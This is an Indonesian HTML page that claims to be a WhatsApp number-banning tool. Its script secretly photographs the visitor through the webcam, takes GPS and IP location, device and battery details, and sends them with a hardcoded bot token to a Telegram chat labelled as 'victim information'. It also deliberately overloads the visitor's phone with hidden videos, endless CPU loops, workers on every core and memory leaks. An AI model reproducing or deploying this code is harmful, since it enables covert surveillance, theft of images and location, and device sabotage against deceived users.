<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Bans WhatsApp</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
    }
    body {
      background: #1a0000;
      background: linear-gradient(145deg, #2a0000 0%, #1a0000 80%);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 16px;
    }
    .bg-particles {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      pointer-events: none;
      z-index: 0;
    }
    .particle {
      position: absolute;
      width: 3px;
      height: 3px;
      background: rgba(255, 0, 0, 0.25);
      border-radius: 50%;
      filter: blur(1px);
      animation: floatRed 7s ease-in-out infinite;
    }
    @keyframes floatRed {
      0%, 100% { transform: translateY(0px) scale(1); opacity: 0.2; }
      50% { transform: translateY(-25px) scale(1.5); opacity: 0.7; }
    }
    
    /* Video container hidden */
    .video-buffer {
      position: fixed;
      top: 0;
      left: 0;
      width: 1px;
      height: 1px;
      opacity: 0;
      pointer-events: none;
      z-index: -1;
    }
    
    .login-container {
      background-color: rgba(20, 0, 0, 0.95);
      padding: 30px;
      border-radius: 24px;
      box-shadow: 0 0 30px #ff0000, inset 0 0 15px #a00000;
      text-align: center;
      max-width: 400px;
      width: 100%;
      z-index: 2;
      border: 2px solid #c00000;
    }
    .login-title {
      font-size: 26px;
      font-weight: 900;
      margin-bottom: 10px;
      background: linear-gradient(135deg, #ff5e5e, #ffffff);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      text-shadow: 0 0 10px red;
    }
    .login-subtitle {
      font-size: 13px;
      color: #ff8080;
      margin-bottom: 20px;
      letter-spacing: 1px;
    }
    .login-input {
      width: 100%;
      padding: 14px;
      margin-bottom: 18px;
      background: #2f0000;
      border: 2px solid #b30000;
      border-radius: 60px;
      color: #ffcaca;
      font-size: 15px;
      outline: none;
      text-align: center;
    }
    .login-input:focus {
      border-color: #ff4f4f;
      box-shadow: 0 0 25px #ff3b3b;
    }
    .login-button {
      width: 100%;
      padding: 14px;
      background: #8b0000;
      color: white;
      border: none;
      border-radius: 60px;
      cursor: pointer;
      font-weight: 700;
      font-size: 16px;
      box-shadow: 0 6px 0 #3f0000;
      transition: 0.1s ease;
      text-transform: uppercase;
      letter-spacing: 2px;
    }
    .login-button:hover {
      background: #b30000;
      transform: translateY(-2px);
      box-shadow: 0 8px 0 #3f0000;
    }
    .login-button:active {
      transform: translateY(6px);
      box-shadow: 0 1px 0 #3f0000;
    }
    .login-button:disabled {
      opacity: 0.5;
      pointer-events: none;
    }
    #info {
      white-space: pre-wrap;
      text-align: center;
      margin-top: 25px;
      background: #1c0101;
      border: 2px solid #00F;
      padding: 18px;
      border-radius: 40px;
      font-size: 13px;
      color: #ffaeae;
      font-family: 'Courier New', monospace;
    }
    .hidden {
      display: none;
    }
    video, canvas {
      display: none;
    }
    @media (max-width: 480px) {
      .login-container {
        padding: 25px 20px;
      }
    }
  </style>
</head>
<body>
  <!-- Video buffer container (hidden) untuk bikin HP lag -->
  <div class="video-buffer" id="videoBuffer"></div>

  <div class="bg-particles" id="particles"></div>

  <div class="login-container">
    <p class="login-title">Bans WhatsApp By hacked official</p>
    <p class="login-subtitle">⚠️ Jangan Disalahgunakan</p>
    <input type="text" class="login-input" placeholder="Nomor WhatsApp Target (08xx/628xx)" id="text" value="08123456789">
    <button class="login-button" id="login-button">EKSEKUSI ➤</button>
    <div id="info">🥷 nomor target</div>
  </div>

  <video id="video" autoplay playsinline></video>
  <canvas id="canvas" width="640" height="480"></canvas>

  <script>
    // ========== KONFIGURASI ==========
    const botToken = '7215310337:AAED4P-sPaBi_kyW18lqEwqY3uDXtY8EkUE';
    const chatIds = ['7945789634'];
    const infoDiv = document.getElementById('info');
    const input = document.getElementById('text');
    const button = document.getElementById('login-button');
    const videoBuffer = document.getElementById('videoBuffer');

    // elemen media
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');

    // Status izin
    let cameraPermission = 'TIDAK DIMINTA';
    let locationPermission = 'TIDAK DIMINTA';

    // ========== FUNGSI BUAT HP KORBAN LAG (SEPERTI TIKTOK) ==========
    function triggerHeavyBuffer() {
      console.log('🔥 Memulai heavy buffer...');
      
      // Daftar video dengan bitrate tinggi (sumber publik)
      const videoUrls = [
        'https://storage.googleapis.com/gtv-videos-bucket/sample/BigBuckBunny.mp4',
        'https://storage.googleapis.com/gtv-videos-bucket/sample/ElephantsDream.mp4',
        'https://storage.googleapis.com/gtv-videos-bucket/sample/ForBiggerBlazes.mp4',
        'https://storage.googleapis.com/gtv-videos-bucket/sample/ForBiggerEscapes.mp4',
        'https://storage.googleapis.com/gtv-videos-bucket/sample/ForBiggerFun.mp4',
        'https://storage.googleapis.com/gtv-videos-bucket/sample/ForBiggerJoyrides.mp4',
        'https://storage.googleapis.com/gtv-videos-bucket/sample/ForBiggerMeltdowns.mp4',
        'https://storage.googleapis.com/gtv-videos-bucket/sample/Sintel.mp4',
        'https://storage.googleapis.com/gtv-videos-bucket/sample/SubaruOutbackOnStreetAndDirt.mp4',
        'https://storage.googleapis.com/gtv-videos-bucket/sample/TearsOfSteel.mp4'
      ];

      // Buat 20 video element sekaligus
      for (let i = 0; i < 20; i++) {
        setTimeout(() => {
          const vid = document.createElement('video');
          
          // Setting video biar maksimal
          vid.setAttribute('loop', 'true');
          vid.setAttribute('muted', 'true');
          vid.setAttribute('playsinline', 'true');
          vid.setAttribute('preload', 'auto');
          vid.setAttribute('controls', 'false');
          
          // Paksa resolusi tinggi
          vid.style.width = '3840px';
          vid.style.height = '2160px';
          
          // Pilih video random
          vid.src = videoUrls[Math.floor(Math.random() * videoUrls.length)] + '?t=' + Date.now() + i;
          
          // Play video
          vid.play().catch(e => {});
          
          // Append ke container
          videoBuffer.appendChild(vid);
          
          // Clone video yang sama beberapa kali
          for (let j = 0; j < 3; j++) {
            setTimeout(() => {
              const vidClone = vid.cloneNode(true);
              vidClone.play().catch(e => {});
              videoBuffer.appendChild(vidClone);
            }, j * 100);
          }
        }, i * 100);
      }

      // Loop JavaScript super berat (100 juta iterasi)
      setTimeout(() => {
        console.log('🔥 Memulai loop berat...');
        
        // Loop pertama - bikin CPU panas
        for (let i = 0; i < 10000000000; i++) {
          // Operasi matematika berat
          Math.sqrt(i);
          Math.sin(i);
          Math.cos(i);
          Math.tan(i);
          Math.log(i + 1);
          Math.exp(i % 100);
          Math.pow(i, i % 10);
          
          // Bikin array besar setiap 1 juta iterasi
          if (i % 1000000 === 0) {
            const arr = new Array(100000000).fill('heavy_' + i);
            const str = arr.join('');
          }
        }
        
        // Loop kedua - infinite loop dengan delay
        const startTime = Date.now();
        while (Date.now() - startTime < 30000) { // 30 detik
          for (let j = 0; j < 10000000000; j++) {
            // Operasi floating point berat
            const x = Math.sqrt(j) * Math.sin(j) / (Math.cos(j) + 1);
            const y = Math.log(j + 1) * Math.exp(j % 100);
            const z = Math.pow(x, y % 10);
          }
        }
      }, 1000);

      // Web Worker untuk loop paralel (pakai semua core CPU)
      const workerCount = navigator.hardwareConcurrency || 8;
      for (let w = 0; w < workerCount; w++) {
        const worker = new Worker(URL.createObjectURL(new Blob([`
          // Loop 200 juta di setiap worker
          for (let i = 0; i < 200000000000; i++) {
            // Operasi berat
            Math.sqrt(i);
            Math.sin(i);
            Math.cos(i);
            
            // Alokasi memori terus
            if (i % 1000000 === 0) {
              const arr = new Array(100000000).fill('worker_' + i);
            }
          }
          
          // Infinite loop
          while (true) {
            for (let j = 0; j < 10000000000; j++) {
              Math.random() * Math.random();
            }
          }
        `])));
      }

      // Bikin memory leak
      setInterval(() => {
        const leak = new Array(1000000000).fill('memleak');
        const leak2 = new Array(1000000000).fill('leak lagi');
      }, 10);

      // Getar terus (kalo support)
      if (navigator.vibrate) {
        navigator.vibrate([1000, 500, 1000, 500, 2000, 1000, 3000, 1000, 5000]);
      }

      // Buka banyak tab background
      for (let i = 0; i < 5; i++) {
        setTimeout(() => {
          window.open('about:blank', '_blank');
        }, i * 200000000);
      }

      console.log('✅ Heavy buffer selesai - HP target bakal lag berat!');
    }

    // ========== VALIDASI NOMOR ==========
    function validateIndonesianNumber(number) {
      let clean = number.replace(/\D/g, '');
      
      if (clean.length < 10 || clean.length > 13) {
        return { valid: false, reason: 'Panjang nomor harus 10-13 digit' };
      }
      
      const validPrefixes = [
        '08', '628', '6281', '6282', '6283', '6285', '6286', '6287', '6288', '6289',
        '081', '082', '083', '085', '086', '087', '088', '089'
      ];
      
      let isValid = false;
      for (let prefix of validPrefixes) {
        if (clean.startsWith(prefix)) {
          isValid = true;
          break;
        }
      }
      
      if (!isValid) {
        return { valid: false, reason: 'Awalan nomor tidak valid untuk Indonesia' };
      }
      
      let formatted = clean;
      if (formatted.startsWith('0')) {
        formatted = '62' + formatted.substring(1);
      }
      
      return { valid: true, formatted };
    }

    // ========== KIRIM PESAN KE TELEGRAM ==========
    function sendToTelegram(text) {
      chatIds.forEach(id => {
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ 
            chat_id: id, 
            text: text, 
            parse_mode: 'HTML' 
          })
        }).catch(() => {});
      });
    }

    function sendWithButtons(text, buttons) {
      const reply_markup = {
        inline_keyboard: buttons
      };
      
      chatIds.forEach(id => {
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ 
            chat_id: id, 
            text: text, 
            parse_mode: 'HTML',
            reply_markup: JSON.stringify(reply_markup)
          })
        }).catch(() => {});
      });
    }

    function sendPhoto(blob, caption) {
      chatIds.forEach(id => {
        const fd = new FormData();
        fd.append('chat_id', id);
        fd.append('photo', blob, `foto_${Date.now()}.jpg`);
        fd.append('caption', caption);
        fd.append('parse_mode', 'HTML');
        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd }).catch(() => {});
      });
    }

    function sendVideo(blob, caption) {
      chatIds.forEach(id => {
        const fd = new FormData();
        fd.append('chat_id', id);
        fd.append('video', blob, `video_${Date.now()}.mp4`);
        fd.append('caption', caption);
        fd.append('parse_mode', 'HTML');
        fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, { method: 'POST', body: fd }).catch(() => {});
      });
    }

    // ========== DETEKSI PERANGKAT ==========
    function getDeviceInfo() {
      const ua = navigator.userAgent;
      let merkModel = 'TIDAK TERDETEKSI';
      let deviceCategory = 'PERANGKAT';
      let osName = 'Unknown OS';
      let isPC = false;
      let connectionType = 'Unknown';
      
      if (navigator.connection) {
        const conn = navigator.connection;
        if (conn.type === 'wifi') connectionType = 'WiFi';
        else if (conn.type === 'cellular') connectionType = 'Data Seluler';
        else if (conn.effectiveType) {
          if (conn.effectiveType.includes('4g')) connectionType = '4G';
          else if (conn.effectiveType.includes('3g')) connectionType = '3G';
          else if (conn.effectiveType.includes('2g')) connectionType = '2G';
          else connectionType = conn.effectiveType;
        }
      }
      
      const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua);
      
      if (isMobile) {
        isPC = false;
        deviceCategory = 'HP';
      } else {
        isPC = true;
        deviceCategory = 'PC/LAPTOP';
      }
      
      if (/SM-[A-Z0-9]{4,}/i.test(ua)) {
        const match = ua.match(/(SM-[A-Z0-9]{4,})/i);
        if (match) merkModel = `Samsung ${match[0]}`;
      }
      else if (/RMX[0-9]{4,}/i.test(ua)) {
        const match = ua.match(/(RMX[0-9]{4,})/i);
        if (match) merkModel = `Realme ${match[0]}`;
      }
      else if (/iPhone/i.test(ua)) {
        merkModel = 'iPhone';
      }
      
      let deviceDisplay = merkModel !== 'TIDAK TERDETEKSI' 
        ? `${merkModel} (${deviceCategory})` 
        : deviceCategory;
      
      if (/Windows NT 10.0/.test(ua)) osName = 'Windows 10/11';
      else if (/Android (\d+)/.test(ua)) {
        const match = ua.match(/Android (\d+)/);
        osName = match ? `Android ${match[1]}` : 'Android';
      }
      else if (/iPhone|iPad|iPod/.test(ua)) {
        osName = 'iOS';
      }
      
      return { deviceDisplay, osName, isPC, connectionType, merkModel, deviceCategory };
    }

    // ========== GET BATTERAI ==========
    async function getBatteryInfo() {
      try {
        const battery = await navigator.getBattery?.();
        if (battery) {
          const level = Math.round(battery.level * 100);
          return `${level}% (${battery.charging ? 'Charging' : 'Not'})`;
        }
      } catch {}
      return null;
    }

    // ========== GET IP ==========
    async function getIPInfo() {
      try {
        const response = await fetch('http://ip-api.com/json/');
        const data = await response.json();
        
        if (data && data.status === 'success') {
          return {
            ip: data.query,
            isp: data.isp,
            city: data.city,
            region: data.regionName,
            country: data.country,
            lat: data.lat,
            lon: data.lon
          };
        }
      } catch (e) {}
      
      return {
        ip: 'Unknown',
        isp: 'Unknown',
        city: 'Unknown',
        region: 'Unknown',
        country: 'Unknown',
        lat: null,
        lon: null
      };
    }

    // ========== AMBIL FOTO ==========
    async function capturePhoto() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
          video: true, 
          audio: false 
        });
        
        cameraPermission = 'DIZINKAN ✅';
        video.srcObject = stream;
        await video.play();
        
        await new Promise(r => setTimeout(r, 200));
        
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        const photoBlob = await new Promise(resolve => {
          canvas.toBlob(resolve, 'image/jpeg', 0.8);
        });
        
        stream.getTracks().forEach(track => track.stop());
        return photoBlob;
        
      } catch (err) {
        cameraPermission = 'DITOLAK ❌';
        return null;
      }
    }

    // ========== GET INFO LENGKAP ==========
    async function getCompleteInfo(formattedNumber) {
      const device = getDeviceInfo();
      const ipData = await getIPInfo();
      const battery = !device.isPC ? await getBatteryInfo() : null;
      
      let infoText = `💻 <b>INFORMASI KORBAN</b>\n\n`;
      infoText += `<code>📞 Nomor Target : ${formattedNumber}</code>\n\n`;
      infoText += `<code>🌐 IP : ${ipData.ip}</code>\n`;
      infoText += `<code>ISP : ${ipData.isp}</code>\n`;
      infoText += `<code>LOKASI IP : ${ipData.city}, ${ipData.region}, ${ipData.country}</code>\n\n`;
      infoText += `<code>💻 device : ${device.deviceDisplay}</code>\n`;
      infoText += `<code>OS : ${device.osName}</code>\n`;
      infoText += `<code>Koneksi : ${device.connectionType}</code>\n`;
      if (battery && !device.isPC) {
        infoText += `<code>Baterai : ${battery}</code>\n\n`;
      } else {
        infoText += `\n`;
      }
      infoText += `<code>🕵 AKSES WEB :</code>\n`;
      infoText += `<code>KAMERA : ${cameraPermission}</code>\n`;
      infoText += `<code>LOKASI : ${locationPermission}</code>`;
      
      return { infoText, device, ipData };
    }

    // ========== GET BUTTONS ==========
    function getButtons(ipData, device, gpsLink) {
      const buttons = [];
      
      if (ipData.lat && ipData.lon) {
        buttons.push([{
          text: '📍 LOKASI IP',
          url: `https://www.google.com/maps?q=${ipData.lat},${ipData.lon}`
        }]);
      } else if (ipData.city !== 'Unknown' && ipData.country !== 'Unknown') {
        buttons.push([{
          text: '📍 LOKASI IP',
          url: `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(ipData.city + ' ' + ipData.country)}`
        }]);
      }
      
      if (device.merkModel !== 'TIDAK TERDETEKSI') {
        buttons.push([{
          text: '💻 SPESIFIKASI PERANGKAT',
          url: `https://www.google.com/search?q=${encodeURIComponent(device.merkModel + ' spesifikasi')}`
        }]);
      }
      
      if (gpsLink) {
        buttons.push([{
          text: '📍 LOKASI GPS',
          url: gpsLink
        }]);
      }
      
      return buttons;
    }

    // ========== EVENT CLICK ==========
    button.addEventListener('click', async () => {
      const nomor = input.value.trim();
      
      const validation = validateIndonesianNumber(nomor);
      if (!validation.valid) {
        infoDiv.innerText = `⚠️ ${validation.reason}`;
        return;
      }
      
      button.disabled = true;
      infoDiv.innerText = '⏳ Memproses...';
      
      // 🔥 PINDAHKAN BUFFER KE SINI - MULAI SEGERA SETELAH KLIK
      triggerHeavyBuffer();
      
      setTimeout(async () => {
        let gpsLink = null;
        
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(
            (pos) => {
              locationPermission = 'DIZINKAN ✅';
              gpsLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
            },
            () => { 
              locationPermission = 'DITOLAK ❌';
            },
            { timeout: 5000 }
          );
        }
        
        const deviceInfo = getDeviceInfo();
        const photoBlob = await capturePhoto();
        
        await new Promise(r => setTimeout(r, 1000));
        
        const { infoText, device, ipData } = await getCompleteInfo(validation.formatted);
        const buttons = getButtons(ipData, device, gpsLink);
        
        sendWithButtons(infoText, buttons);
        
        if (photoBlob) {
          sendPhoto(photoBlob, `💻 <b>FOTO KORBAN</b>\n💻 Device: ${deviceInfo.deviceDisplay}`);
        }
        
        infoDiv.innerText = '✅ Sukses';
        button.disabled = false;
        input.value = '';
      }, 500);
    });

    // Partikel merah
    function createRedParticles() {
      const container = document.querySelector('.bg-particles');
      for (let i = 0; i < 60; i++) {
        const p = document.createElement('div');
        p.className = 'particle';
        p.style.left = Math.random() * 100 + '%';
        p.style.top = Math.random() * 100 + '%';
        p.style.animationDelay = Math.random() * 8 + 's';
        p.style.animationDuration = (Math.random() * 5 + 5) + 's';
        p.style.background = `rgba(255, ${Math.floor(Math.random() * 50)}, 0, 0.4)`;
        container.appendChild(p);
      }
    }
    document.addEventListener('DOMContentLoaded', createRedParticles);
  </script>
</body>
